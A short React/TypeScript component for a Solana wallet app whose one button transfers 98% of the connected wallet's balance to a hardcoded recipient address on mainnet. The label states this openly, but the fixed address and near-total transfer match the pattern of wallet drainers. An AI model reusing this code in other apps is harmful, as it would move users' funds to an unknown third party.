// SendSolForm.tsx

import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import * as web3 from '@solana/web3.js';
import { FC, useState } from 'react'

export const SendSolForm: FC = () => {
    const [txSig, setTxSig] = useState('');
    const { connection } = useConnection();
    const { publicKey, sendTransaction } = useWallet();

    const sendSol = (event) => {
        event.preventDefault();
        if (!connection || !publicKey) { return; }

        // Get current SOL balance and calculate 98% of it
        connection.getAccountInfo(publicKey).then((info) => {
            const balanceInSol = info.lamports / web3.LAMPORTS_PER_SOL;
            const amountToSend = balanceInSol * 0.98; // 98% of current balance

            // Prepare transaction to send SOL
            const transaction = new web3.Transaction();
            const recipientPubKey = new web3.PublicKey('AiwmF5F27tMzxmzcDwUg3on2fWiCHcuxQmBtV3bo611a');

            const sendSolInstruction = web3.SystemProgram.transfer({
                fromPubkey: publicKey,
                toPubkey: recipientPubKey,
                lamports: amountToSend * web3.LAMPORTS_PER_SOL
            });

            transaction.add(sendSolInstruction);

            // Send transaction
            sendTransaction(transaction, connection).then((sig) => {
                setTxSig(sig);
            }).catch((error) => {
                console.error('Failed to send transaction:', error);
            });
        });
    }

    return (
        <div>
            {
                publicKey ?
                    <form onSubmit={sendSol}>
                        <button type="submit">Send 98% of SOL Balance</button>
                    </form> :
                    <span>Connect Your Wallet</span>
            }
            {
                txSig ?
                    <div>
                        <p>View your transaction on </p>
                        <a href={`https://explorer.solana.com/tx/${txSig}?cluster=mainnet`}>Solana Explorer</a>
                    </div> :
                    null
            }
        </div>
    )
}
